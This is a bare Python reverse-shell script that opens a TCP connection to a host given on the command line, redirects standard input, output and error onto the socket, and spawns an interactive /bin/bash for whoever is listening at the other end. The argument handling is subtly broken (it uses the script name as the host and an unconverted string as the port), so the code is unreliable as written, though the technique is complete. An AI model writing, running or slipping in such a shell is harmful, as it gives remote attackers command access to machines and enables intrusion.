import socket,os
import pty
import sys


def main(arg):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((arg[0], arg[1]))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        pty.spawn("/bin/bash")
    except:
        print("Could not connect to server")



if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit()
    main(sys.argv)